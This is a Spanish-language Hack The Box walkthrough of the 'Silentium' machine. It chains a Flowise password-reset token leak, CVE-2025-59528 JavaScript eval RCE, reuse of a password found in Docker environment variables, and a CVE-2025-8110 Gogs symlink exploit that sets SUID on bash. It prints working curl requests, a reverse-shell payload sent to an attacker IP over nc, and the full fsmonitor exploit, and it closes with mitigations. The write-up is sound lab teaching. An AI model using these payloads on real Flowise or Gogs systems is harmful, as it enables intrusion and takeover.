---
title: "HTB Walkthrough: Silentium"
date: 2026-04-12
draft: false
description: "Walkthrough completo de la máquina Silentium de Hack The Box. Dificultad Easy, Linux Ubuntu 24.04. IDOR en el reset de contraseña de Flowise expone tempToken en la respuesta, CVE-2025-59528 JS eval RCE en Docker, reutilización de credenciales SSH desde variables de entorno y escalada root via CVE-2025-8110 en Gogs 0.13.0 (symlink + fsmonitor SUID bash)."
tags: ["HackTheBox", "Linux", "Easy", "Flowise", "IDOR", "RCE", "Docker", "Gogs", "Symlink", "SUID", "CVE-2025-59528", "CVE-2025-8110", "PasswordReuse", "PortForwarding", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough de **Silentium** en Hack The Box. Máquina de dificultad **Easy** con **Linux (Ubuntu 24.04 LTS)**. IDOR en el endpoint de reset de contraseña de **Flowise** que devuelve `tempToken` directamente en el JSON — sin necesidad de acceder al email. **CVE-2025-59528** (eval de JavaScript en el endpoint `customMCP`) da RCE dentro de un contenedor Docker, donde credenciales SMTP se filtran por variables de entorno y se reutilizan en SSH. Escalada de privilegios mediante **CVE-2025-8110** en **Gogs 0.13.0**: traversal de symlink sobreescribe `.git/config` y la directiva `fsmonitor` ejecuta `chmod +s /usr/bin/bash` con privilegios de root.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                                                         |
|----------------|---------------------------------------------------------------------------------------------------------------------------------|
| **Nombre**     | Silentium                                                                                                                       |
| **SO**         | Linux (Ubuntu 24.04 LTS)                                                                                                        |
| **Dificultad** | Easy                                                                                                                            |
| **IP**         | 10.129.17.219                                                                                                                   |
| **Técnicas**   | IDOR · CVE-2025-59528 JS eval RCE · Filtración de credenciales en Docker env · Reutilización SSH · CVE-2025-8110 Gogs symlink + fsmonitor SUID |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.17.219
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -sC -sV -p22,80 10.129.17.219
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
```

> **💡 Superficie de ataque:** Mínima — solo SSH y una web en nginx. Toda la investigación inicial pasa necesariamente por la web.

---

### 1.2 Enumeración Web

La web es una landing page corporativa de una firma financiera ficticia. En la sección de equipo ("Leadership") encontramos tres nombres:

- **Marcus Thorne** — Managing Director
- **Ben** — Head of Financial Systems *(sin apellido)*
- **Elena Rossi** — Chief Risk Officer

> **💡 Inferencia de usuario:** Ben es el único miembro sin apellido. Su nombre de usuario probablemente sea simplemente `ben`.

Añadimos `silentium.htb` a `/etc/hosts` y enumeramos directorios — sin resultados accionables en el dominio raíz. Pivotamos a descubrimiento de virtual hosts.

---

### 1.3 Fuzzing de Virtual Hosts

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://silentium.htb/ \
     -H "Host: FUZZ.silentium.htb" \
     -fs 178
```

```
staging    [Status: 200, Size: 3142, Duration: 54ms]
```

Añadimos `staging.silentium.htb` a `/etc/hosts`. Al visitarlo encontramos una instancia de **Flowise** — plataforma open-source para construir agentes de IA visualmente.

> **💡 Hallazgo clave:** Flowise 3.0.5 está afectado por CVE-2025-59528 (versiones ≥ 2.2.7-patch.1 y < 3.0.6) — pero el exploit de RCE **requiere credenciales válidas**. Necesitamos autenticarnos primero.

---

## 2. IDOR en el Reset de Contraseña de Flowise

### 2.1 Identificación de la Vulnerabilidad

Inspeccionando el JavaScript del frontend encontramos la vista de "Forgot Password":

```
http://staging.silentium.htb/assets/forgotPassword-Dt6O5dqm.js
```

El flujo de reset llama a `/api/v1/account/forgot-password`. La vulnerabilidad crítica: **la respuesta devuelve el `tempToken` directamente en el JSON**, sin enviarlo solo por correo. Cualquiera que llame a este endpoint puede resetear la contraseña de cualquier cuenta.

```
Flujo normal:    petición forgot-password → token enviado solo al email del usuario
Flujo malicioso: petición forgot-password → token devuelto en el cuerpo del JSON
                 → atacante lee el token → resetea la contraseña de cualquier cuenta
```

### 2.2 Explotación del IDOR

**Paso 1 — Solicitar el reset para `ben@silentium.htb`:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
```

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "emqTPCpyFjXYJwk15kpm3YBy4SyU1No1ysNewciMHiAfvykO57xZhY0rzBTvEJCW",
    "tokenExpiry": "2026-04-11T21:02:58.455Z",
    "status": "active"
  }
}
```

El token aparece en la respuesta — sin necesidad de acceder al email del usuario.

**Paso 2 — Usar el token para establecer una nueva contraseña:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "emqTPCpyFjXYJwk15kpm3YBy4SyU1No1ysNewciMHiAfvykO57xZhY0rzBTvEJCW",
      "password": "1234.Abcd"
    }
  }'
```

```json
{"user": {"email": "ben@silentium.htb", "tempToken": "", "status": "active"}}
```

> **🔑 Credenciales obtenidas:** `ben@silentium.htb : 1234.Abcd`

---

## 3. CVE-2025-59528 — Flowise JS RCE

### 3.1 Metasploit

```bash
[msf] >> use exploit/multi/http/flowise_js_rce
[msf] >> set RHOSTS 10.129.17.219
[msf] >> set VHOST staging.silentium.htb
[msf] >> set RPORT 80
[msf] >> set LHOST tun0
[msf] >> set FLOWISE_EMAIL ben@silentium.htb
[msf] >> set FLOWISE_PASSWORD 1234.Abcd
[msf] >> run
```

```
[*] Flowise version detected: 3.0.5
[+] Authentication successful
[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.17.219:57642)
```

Estamos dentro, pero **dentro de un contenedor Docker** (confirmado por `/.dockerenv`).

### 3.2 Explotación Manual — Endpoint `customMCP`

El endpoint `/api/v1/node-load-method/customMCP` acepta una cadena de configuración de servidor MCP que se evalúa como JavaScript en el servidor Node.js sin sanitización.

```
Flujo normal:    mcpServerConfig = "config JS válida" → lista acciones MCP disponibles
Flujo malicioso: mcpServerConfig = "({x:(function(){require('child_process').exec(...)})})"
                 → comando OS arbitrario ejecutado en el servidor
```

Desde la consola del navegador con sesión iniciada en Flowise:

```javascript
fetch('/api/v1/node-load-method/customMCP', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'x-request-from': 'internal'
  },
  body: JSON.stringify({
    loadMethod: "listActions",
    inputs: {
      mcpServerConfig: "({x:(function(){const cp = process.mainModule.require('child_process'); cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.237 4444 >/tmp/f'); return 1;})()})"
    }
  })
}).then(res => res.json()).then(console.log);
```

Con `nc -lvnp 4444` activo obtenemos shell en el contenedor. Inspeccionamos las variables de entorno:

```bash
env
```

```
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SENDER_EMAIL=ben@silentium.htb
SMTP_PASSWORD=r04D!!_R4ge
SMTP_USERNAME=test
SMTP_HOST=mailhog
SMTP_PORT=1025
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
```

> **💡 Hallazgo clave:** Credenciales en variables de entorno — `ben` / `r04D!!_R4ge` (contraseña SMTP) — candidatas a reutilización en el sistema host.

---

## 4. User Flag

```bash
ssh ben@10.129.17.219
# Password: r04D!!_R4ge
```

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
ben@silentium:~$
```

La contraseña SMTP se reutilizó en el sistema host.

```bash
ben@silentium:~$ cat user.txt
```

> 🔑 User flag obtenida.

---

## 5. Escalada de Privilegios — CVE-2025-8110 (Gogs Symlink)

### 5.1 Descubrimiento de Servicios Internos

```bash
ben@silentium:~$ netstat -tulpn | grep 127.0.0.1
```

```
tcp  0  0  127.0.0.1:3000   0.0.0.0:*  LISTEN  -   ← Flowise
tcp  0  0  127.0.0.1:3001   0.0.0.0:*  LISTEN  -   ← Gogs
tcp  0  0  127.0.0.1:8025   0.0.0.0:*  LISTEN  -   ← MailHog (UI)
tcp  0  0  127.0.0.1:1025   0.0.0.0:*  LISTEN  -   ← MailHog (SMTP)
```

> **⚠️ Servicio vulnerable:** El puerto **3001** aloja **Gogs 0.13.0**, vulnerable a **CVE-2025-8110**. Permite sobreescribir archivos arbitrarios del servidor mediante un symlink malicioso en un repositorio Git — y solo accesible desde localhost.

### 5.2 Port Forwarding

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.17.219
```

Accedemos a `http://127.0.0.1:3001` y registramos el usuario `tester`.

### 5.3 ¿Cómo Funciona CVE-2025-8110?

Gogs no valida correctamente los symlinks dentro de los repositorios Git. Si subimos un symlink que apunta a `.git/config` y luego usamos la API para escribir contenido a través de ese symlink, sobreescribimos el `.git/config` real del repositorio en el servidor. En el siguiente push, Git lee ese config modificado y ejecuta el comando especificado en la directiva `fsmonitor`.

```
Flujo normal:    push → Gogs almacena ficheros → .git/config intacto
Flujo malicioso: push symlink (→ .git/config) → escritura API a través del symlink
                 → sobreescribe .git/config en el servidor con payload fsmonitor
                 → siguiente push → Git ejecuta comando fsmonitor como proceso Gogs (root)
```

### 5.4 Preparar el Repositorio con el Symlink

```bash
ben@silentium:/tmp$ mkdir pwn_local && cd pwn_local
ben@silentium:/tmp/pwn_local$ git init
ben@silentium:/tmp/pwn_local$ ln -s .git/config evil_link
ben@silentium:/tmp/pwn_local$ git add evil_link
ben@silentium:/tmp/pwn_local$ git commit -m "Add symlink"
```

Crear el repositorio `pwn` vacío en Gogs desde la interfaz web, luego subir:

```bash
ben@silentium:/tmp/pwn_local$ git remote add origin http://127.0.0.1:3001/tester/pwn.git
ben@silentium:/tmp/pwn_local$ git push origin master
```

### 5.5 Escribir el Config Malicioso a través de la API

La directiva `fsmonitor` en `.git/config` especifica un comando que Git ejecuta al procesar el repositorio. Lo usamos para activar el bit SUID en `/usr/bin/bash`:

```bash
cat << EOF > exploit_config
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
    fsmonitor = "chmod +s /usr/bin/bash"
EOF

PAYLOAD=$(base64 -w 0 < exploit_config)

curl -X PUT "http://127.0.0.1:3001/api/v1/repos/tester/pwn/contents/evil_link" \
  -H "Authorization: token 36a4fbd1b1d0343a8cf4a7efb41a6314a0662489" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"pwn\", \"content\":\"$PAYLOAD\"}"
```

### 5.6 Disparar el `fsmonitor` y Obtener Root

```bash
ben@silentium:/tmp/pwn_local$ git commit --allow-empty -m "trigger"
ben@silentium:/tmp/pwn_local$ git push origin master
```

Cuando Gogs procesa el push, Git lee el config modificado y ejecuta `chmod +s /usr/bin/bash` con los privilegios del proceso de Gogs (root).

```bash
ben@silentium:/tmp/pwn_local$ ls -l /usr/bin/bash
-rwsrwsrwx 1 root root 1446024 Mar 31 2024 /usr/bin/bash

ben@silentium:/tmp/pwn_local$ bash -p
```

> **💡 Detalle clave:** El flag `-p` activa el modo "privilegiado" de bash, que impide descartar el EUID al inicio. Sin él, bash ignoraría el bit SUID como medida de seguridad moderna.

```
bash-5.2# id
uid=1000(ben) gid=1000(ben) euid=0(root) egid=0(root) groups=0(root)
```

---

## 6. Root Flag

```bash
bash-5.2# cat /root/root.txt
```

> 🏁 Root flag obtenida.

---

## 7. Resumen y Lecciones Aprendidas

**Cadena de compromiso:**

1. **Reconocimiento** → Puerto 80 (nginx) + puerto 22. El fuzzing de virtual hosts revela `staging.silentium.htb` con Flowise 3.0.5.
2. **IDOR** → `/api/v1/account/forgot-password` devuelve `tempToken` en el cuerpo → reset de contraseña para `ben@silentium.htb`.
3. **CVE-2025-59528** → JS eval en `/api/v1/node-load-method/customMCP` → RCE dentro del contenedor Docker.
4. **Filtración de credenciales** → `env` muestra `SMTP_PASSWORD=r04D!!_R4ge`.
5. **Acceso SSH** → Reutilización de contraseña: `ben:r04D!!_R4ge` → `user.txt`.
6. **CVE-2025-8110** → Gogs 0.13.0 en puerto 3001 (localhost) → symlink + escritura API sobreescribe `.git/config` → `fsmonitor` ejecuta `chmod +s /usr/bin/bash` como root → `bash -p` → `root.txt`.

**Qué aprendí de esta máquina:**

- **El IDOR en flujos de autenticación tiene un impacto desproporcionado.** Devolver `tempToken` en el cuerpo de la respuesta elimina efectivamente la autenticación del reset de contraseña. El fix es trivial: devolver solo un estado de éxito, nunca el token en sí.

- **CVE-2025-59528 es un ejemplo perfecto de `eval` inseguro en un contexto supuestamente interno.** El endpoint `customMCP` estaba pensado para uso interno, pero sin sanitización cualquier usuario autenticado pasa a ser root en el proceso Node.js. "Uso interno" no es un límite de seguridad cuando la funcionalidad está expuesta en un puerto accesible desde la red.

- **Las credenciales en variables de entorno son visibles para cualquiera con acceso al proceso.** La inyección de variables de entorno en Docker es cómoda, pero expone todo a cualquiera que ejecute `env` dentro del contenedor. Los gestores de secretos (Vault, AWS Secrets Manager, Docker secrets) existen precisamente para evitar esto.

- **La reutilización de contraseñas entre servicios del mismo host es un multiplicador de daño.** La contraseña SMTP de un contenedor Docker se convirtió en acceso SSH al host. Una credencial, dos servicios, punto de apoyo completo.

- **Las vulnerabilidades de symlinks en plataformas Git son sutiles pero graves.** CVE-2025-8110 requiere entender los internos de Git — cómo `.git/config` controla la ejecución de hooks y filtros — para apreciar por qué una sobreescritura es RCE. La directiva `fsmonitor` no se audita habitualmente aunque ejecute comandos arbitrarios en cada operación Git.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| IDOR reset contraseña (`tempToken` en respuesta) | Nunca devolver el token en la respuesta API; enviarlo **solo** por email |
| CVE-2025-59528 — JS eval en `customMCP` | Actualizar Flowise ≥ 3.0.6; no evaluar input del usuario como código |
| Credenciales en variables de entorno Docker | Usar gestores de secretos (Vault, AWS Secrets Manager, Docker secrets) |
| Reutilización de contraseña SSH/SMTP | Credencial única por servicio; usar un gestor de contraseñas |
| CVE-2025-8110 — Gogs symlink + `fsmonitor` | Actualizar Gogs a versión parcheada; nunca ejecutar el servicio como root |
| `fsmonitor` sin restricción | Configurar `safe.directory`; deshabilitar `fsmonitor` en configuraciones Git del lado del servidor |
